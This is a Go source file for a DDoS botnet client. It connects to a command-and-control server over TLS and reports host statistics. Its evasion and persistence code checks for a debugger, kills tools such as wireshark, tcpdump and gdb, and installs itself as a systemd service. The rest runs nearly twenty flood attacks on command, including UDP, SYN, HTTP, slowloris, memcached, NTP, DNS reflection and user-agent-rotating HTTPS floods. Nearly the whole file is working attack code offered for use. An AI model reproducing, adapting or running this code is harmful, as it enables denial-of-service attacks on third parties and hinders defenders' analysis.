package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	serverAddr    = "C2_PROXYIP:7002"
	pingInterval  = 7 * time.Second
	statsInterval = 7 * time.Second
)

const (
	colorReset   = "\033[0m"
	colorRed     = "\033[31m"
	colorGreen   = "\033[32m"
	colorYellow  = "\033[33m"
	colorBlue    = "\033[34m"
	colorMagenta = "\033[35m"
	colorCyan    = "\033[36m"
	colorWhite   = "\033[37m"
)

type BotStats struct {
	StartTime    time.Time
	AttackCount  int
	SuccessCount int
	LastCommand  time.Time
}

var (
	stats            = make(map[string]*BotStats)
	statsLock        sync.Mutex
	currentArch      = runtime.GOARCH
	activeConns      = make(map[net.Conn]bool)
	connLock         sync.Mutex
	processStartTime = time.Now()
	lastCommandTime  = time.Now()
	totalAttackCount = 0
	userAgents       = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Googlebot/2.1 (+http://www.google.com/bot.html)",
		"curl/7.68.0",
	}
)

func formatHostPort(host, port string) string {
	if strings.Contains(host, ":") && !strings.HasPrefix(host, "[") {
		return fmt.Sprintf("[%s]:%s", host, port)
	}
	return fmt.Sprintf("%s:%s", host, port)
}

func main() {
	logInfo("Starting bot process", fmt.Sprintf("PID: %d", os.Getpid()))

	if isDebugging() {
		logError("Debugger detected", "Exiting to avoid analysis")
		os.Exit(1)
	}

	logInfo("Security", "Killing analysis tools")
	killAnalysisTools()

	logInfo("Persistence", "Setting up service")
	go persistenceMechanism()

	logInfo("TLS", "Loading certificates")
	caCert, err := ioutil.ReadFile("certs/ca.crt")
	if err != nil {
		logError("TLS", "Failed to read CA certificate")
		return
	}

	caCertPool := x509.NewCertPool()
	if !caCertPool.AppendCertsFromPEM(caCert) {
		logError("TLS", "Failed to parse CA certificate")
		return
	}

	cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
	if err != nil {
		logError("TLS", "Failed to load client certificate")
		return
	}

	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		RootCAs:            caCertPool,
		MinVersion:         tls.VersionTLS13,
		InsecureSkipVerify: true,
	}

	for {
		logInfo("Connection", fmt.Sprintf("Attempting to connect to %s", serverAddr))
		conn, err := tls.Dial("tcp", serverAddr, tlsConfig)
		if err != nil {
			logError("Connection", fmt.Sprintf("Failed to connect: %v", err))
			logInfo("Connection", "Retrying in 30 seconds")
			time.Sleep(30 * time.Second)
			continue
		}

		logSuccess("Connection", "Established secure connection to C2 server")
		registerBot(conn)
		handleConnection(conn)
		cleanupConnection(conn)
		logWarning("Connection", "Disconnected from server, reconnecting...")
	}
}

func logInfo(category, message string) {
	fmt.Printf("[%s%s%s] %s%s%s\n", colorBlue, category, colorReset, colorWhite, message, colorReset)
}

func logSuccess(category, message string) {
	fmt.Printf("[%s%s%s] %s%s%s\n", colorGreen, category, colorReset, colorWhite, message, colorReset)
}

func logWarning(category, message string) {
	fmt.Printf("[%s%s%s] %s%s%s\n", colorYellow, category, colorReset, colorWhite, message, colorReset)
}

func logError(category, message string) {
	fmt.Printf("[%s%s%s] %s%s%s\n", colorRed, category, colorReset, colorWhite, message, colorReset)
}

func logCommand(category, message string) {
	fmt.Printf("[%s%s%s] %s%s%s\n", colorMagenta, category, colorReset, colorWhite, message, colorReset)
}

func isDebugging() bool {
	logInfo("Security", "Checking for debugger attachment")
	_, err := os.Stat("/proc/self/status")
	if err != nil {
		return false
	}

	data, err := ioutil.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}
	return !strings.Contains(string(data), "TracerPid:\t0")
}

func killAnalysisTools() {
	tools := []string{"wireshark", "tcpdump", "strace", "ltrace", "gdb"}
	for _, tool := range tools {
		logInfo("Security", fmt.Sprintf("Attempting to kill %s", tool))
		err := exec.Command("pkill", "-9", tool).Run()
		if err == nil {
			logSuccess("Security", fmt.Sprintf("Successfully killed %s", tool))
		}
	}
}

func persistenceMechanism() {
	service := `[Unit]
Description=Bot Service
After=network.target

[Service]
Type=simple
Restart=always
ExecStart=` + os.Args[0] + `

[Install]
WantedBy=multi-user.target`

	logInfo("Persistence", "Creating systemd service file")
	err := ioutil.WriteFile("/etc/systemd/system/bot.service", []byte(service), 0644)
	if err != nil {
		logError("Persistence", "Failed to create service file")
		return
	}

	logInfo("Persistence", "Reloading systemd daemon")
	exec.Command("systemctl", "daemon-reload").Run()

	logInfo("Persistence", "Enabling service")
	exec.Command("systemctl", "enable", "bot.service").Run()

	logInfo("Persistence", "Starting service")
	exec.Command("systemctl", "start", "bot.service").Run()

	logSuccess("Persistence", "Service installed and started successfully")
}

func registerBot(conn net.Conn) {
	remoteAddr := conn.RemoteAddr().String()
	logInfo("Connection", fmt.Sprintf("Registering bot with server (%s)", remoteAddr))

	connLock.Lock()
	activeConns[conn] = true
	connLock.Unlock()

	stats := collectBotStats()
	logInfo("Stats", fmt.Sprintf("Sending initial stats: %s", stats))
	conn.Write([]byte(fmt.Sprintf("PONG:%s:%s\n", encryptMessage(currentArch), encryptMessage(stats))))

	logInfo("Heartbeat", "Starting ping handler")
	go pingHandler(conn)
}

func cleanupConnection(conn net.Conn) {
	remoteAddr := conn.RemoteAddr().String()
	logWarning("Connection", fmt.Sprintf("Cleaning up connection to %s", remoteAddr))

	connLock.Lock()
	delete(activeConns, conn)
	connLock.Unlock()
	conn.Close()
}

func pingHandler(conn net.Conn) {
	remoteAddr := conn.RemoteAddr().String()
	ticker := time.NewTicker(pingInterval)
	defer ticker.Stop()

	logInfo("Heartbeat", fmt.Sprintf("Starting ping loop for %s", remoteAddr))

	for range ticker.C {
		connLock.Lock()
		if !activeConns[conn] {
			connLock.Unlock()
			logWarning("Heartbeat", fmt.Sprintf("Connection %s no longer active, stopping ping", remoteAddr))
			return
		}
		connLock.Unlock()

		stats := collectBotStats()
		msg := fmt.Sprintf("PONG:%s:%s\n", encryptMessage(currentArch), encryptMessage(stats))
		logInfo("Heartbeat", fmt.Sprintf("Sending PONG to %s: %s", remoteAddr, msg))
		_, err := conn.Write([]byte(msg))
		if err != nil {
			logError("Heartbeat", fmt.Sprintf("Failed to send PONG to %s: %v", remoteAddr, err))
			return
		}
	}
}

func collectBotStats() string {
	ram := getSystemRAM()
	cores := getCPUCount()
	uptime := time.Since(processStartTime).Seconds()

	statsLock.Lock()
	attackCount := totalAttackCount
	statsLock.Unlock()

	stats := fmt.Sprintf("%.2f|%.2f|%.1f|%d",
		time.Since(lastCommandTime).Seconds(),
		float64(attackCount)/uptime,
		ram,
		cores)

	logInfo("Stats", fmt.Sprintf("Collected stats: Latency=%.2fs, Throughput=%.2f/s, RAM=%.1fGB, Cores=%d",
		time.Since(lastCommandTime).Seconds(),
		float64(attackCount)/uptime,
		ram,
		cores))

	return stats
}

func getSystemRAM() float64 {
	data, err := ioutil.ReadFile("/proc/meminfo")
	if err != nil {
		logError("System", "Failed to read memory info")
		return 0
	}

	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "MemTotal:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				kb, err := strconv.ParseFloat(fields[1], 64)
				if err != nil {
					logError("System", "Failed to parse memory size")
					return 0
				}
				gb := kb / 1024 / 1024
				logInfo("System", fmt.Sprintf("System RAM: %.1fGB", gb))
				return gb
			}
		}
	}
	logError("System", "Could not find MemTotal in /proc/meminfo")
	return 0
}

func getCPUCount() int {
	cores := runtime.NumCPU()
	logInfo("System", fmt.Sprintf("CPU cores detected: %d", cores))
	return cores
}

func handleConnection(conn net.Conn) {
	remoteAddr := conn.RemoteAddr().String()
	logInfo("Connection", fmt.Sprintf("Starting handler for %s", remoteAddr))

	reader := bufio.NewReader(conn)
	for {
		conn.SetReadDeadline(time.Now().Add(2 * pingInterval))
		message, err := reader.ReadString('\n')
		if err != nil {
			logError("Connection", fmt.Sprintf("Error reading from %s: %v", remoteAddr, err))
			return
		}

		decrypted := strings.TrimSpace(decryptMessage(message))
		if decrypted == "" {
			continue
		}

		logCommand("Received", fmt.Sprintf("Message from %s: %s", remoteAddr, decrypted))

		if strings.HasPrefix(decrypted, "!") {
			logInfo("Command", fmt.Sprintf("Processing command: %s", decrypted))
			handleCommand(conn, decrypted)
		}
	}
}

func handleCommand(_ net.Conn, command string) {
	parts := strings.Fields(command)
	if len(parts) < 4 {
		logError("Command", "Invalid command format")
		return
	}

	method := parts[0]
	target := parts[1]
	port := parts[2]
	duration := parts[3]

	logInfo("Command", fmt.Sprintf("New attack command: Method=%s Target=%s:%s Duration=%ss",
		method, target, port, duration))

	statsLock.Lock()
	if _, exists := stats[target]; !exists {
		stats[target] = &BotStats{StartTime: time.Now()}
	}
	stats[target].AttackCount++
	totalAttackCount++
	stats[target].LastCommand = time.Now()
	lastCommandTime = time.Now()
	statsLock.Unlock()

	dur, err := strconv.Atoi(duration)
	if err != nil || dur <= 0 {
		logError("Command", "Invalid duration parameter")
		return
	}

	logSuccess("Attack", fmt.Sprintf("Launching %s attack on %s:%s for %d seconds",
		method, target, port, dur))
	go executeAttack(method, target, port, dur)

	statsLock.Lock()
	stats[target].SuccessCount++
	statsLock.Unlock()
}

func executeAttack(method, target, port string, duration int) {
	_ = time.Now()

	switch method {
	case "!udpflood":
		udpFlood(target, port, duration)
	case "!udpsmart":
		udpSmart(target, port, duration)
	case "!tcpflood":
		tcpFlood(target, port, duration)
	case "!synflood":
		synFlood(target, port, duration)
	case "!ackflood":
		ackFlood(target, port, duration)
	case "!greflood":
		greFlood(target, port, duration)
	case "!dns":
		dnsFlood(target, port, duration)
	case "!http":
		httpFlood(target, port, duration)
	case "!icmpflood":
		icmpFlood(target, duration)
	case "!slowloris":
		slowloris(target, port, duration)
	case "!memcached":
		memcached(target, port, duration)
	case "!ntp":
		ntpAmplification(target, port, duration)
	case "!tcpack":
		tcpAckFlood(target, port, duration)
	case "!udplag":
		udpLag(target, port, duration)
	case "!dnsreflect":
		dnsReflect(target, port, duration)
	case "!synack":
		synAckFlood(target, port, duration)
	case "!tlsflood":
		tlsFlood(target, port, duration)
	case "!httpsbypass":
		httpsBypass(target, port, duration)
	case "!highrps":
		highRps(target, port, duration)
	default:
		return
	}
}

func encryptMessage(msg string) string {
	return fmt.Sprintf("%x", msg)
}

func decryptMessage(msg string) string {
	decoded, err := hex.DecodeString(msg)
	if err != nil {
		return msg
	}
	return string(decoded)
}

func udpFlood(target, port string, duration int) {
	payload := make([]byte, 1024)
	rand.Read(payload)
	dst := formatHostPort(target, port)
	conn, err := net.Dial("udp", dst)
	if err != nil {
		return
	}
	defer conn.Close()

	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		conn.Write(payload)
		time.Sleep(10 * time.Millisecond)
	}
}

func udpSmart(target, port string, duration int) {
	dst := formatHostPort(target, port)
	conn, err := net.Dial("udp", dst)
	if err != nil {
		return
	}
	defer conn.Close()

	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		payload := make([]byte, 500+rand.Intn(500))
		rand.Read(payload)
		conn.Write(payload)
		time.Sleep(5 * time.Millisecond)
	}
}

func tcpFlood(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("tcp", dst)
			if err != nil {
				return
			}
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func synFlood(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("tcp", dst)
			if err != nil {
				return
			}
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func ackFlood(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("tcp", dst)
			if err != nil {
				return
			}
			conn.Write([]byte("ACK"))
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func greFlood(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("tcp", dst)
			if err != nil {
				return
			}
			conn.Write([]byte("GRE"))
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func dnsFlood(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("udp", dst)
			if err != nil {
				return
			}
			conn.Write([]byte("DNS"))
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func httpFlood(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("tcp", dst)
			if err != nil {
				return
			}
			conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"))
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func icmpFlood(target string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		exec.Command("ping", "-c", "1", "-s", "65500", target).Run()
		time.Sleep(100 * time.Millisecond)
	}
}

func slowloris(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("tcp", dst)
			if err != nil {
				return
			}
			conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n"))
			time.Sleep(10 * time.Second)
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func memcached(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("udp", dst)
			if err != nil {
				return
			}
			conn.Write([]byte("set x 0 0 1048576\r\n" + strings.Repeat("a", 1048576) + "\r\n"))
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func ntpAmplification(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("udp", dst)
			if err != nil {
				return
			}
			conn.Write([]byte("\x17\x00\x03\x2a" + strings.Repeat("\x00", 468)))
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func tcpAckFlood(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("tcp", dst)
			if err != nil {
				return
			}
			conn.Write([]byte(fmt.Sprintf("ACK %d\r\n", rand.Intn(1000000))))
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func udpLag(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("udp", dst)
			if err != nil {
				return
			}
			payload := make([]byte, 500+rand.Intn(500))
			rand.Read(payload)
			payload[8] = 0xFF
			payload[9] = 0xFF
			conn.Write(payload)
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func dnsReflect(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	domains := []string{"example.com", "google.com", "cloudflare.com", "amazon.com"}

	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("udp", dst)
			if err != nil {
				return
			}
			query := fmt.Sprintf("%s ANY %s", randStr(10), domains[rand.Intn(len(domains))])
			conn.Write([]byte(query))
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func synAckFlood(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("tcp", dst)
			if err != nil {
				return
			}
			conn.Write([]byte(fmt.Sprintf("SYN %d\r\nACK %d\r\n", rand.Intn(1000000), rand.Intn(1000000))))
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func tlsFlood(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conf := &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				ServerName:         target,
			}
			conn, err := tls.Dial("tcp", dst, conf)
			if err != nil {
				return
			}
			conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"))
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func httpsBypass(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	paths := []string{"/", "/api/v1", "/wp-admin", "/admin", "/static/js/main.js"}

	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("tcp", dst)
			if err != nil {
				return
			}
			ua := userAgents[rand.Intn(len(userAgents))]
			path := paths[rand.Intn(len(paths))]
			req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n", path, target, ua)
			conn.Write([]byte(req))
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func highRps(target, port string, duration int) {
	dst := formatHostPort(target, port)
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, err := net.Dial("tcp", dst)
			if err != nil {
				return
			}
			for i := 0; i < 100; i++ {
				conn.Write([]byte(fmt.Sprintf("GET /%d HTTP/1.1\r\nHost: %s\r\n\r\n", i, target)))
			}
			conn.Close()
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func randStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
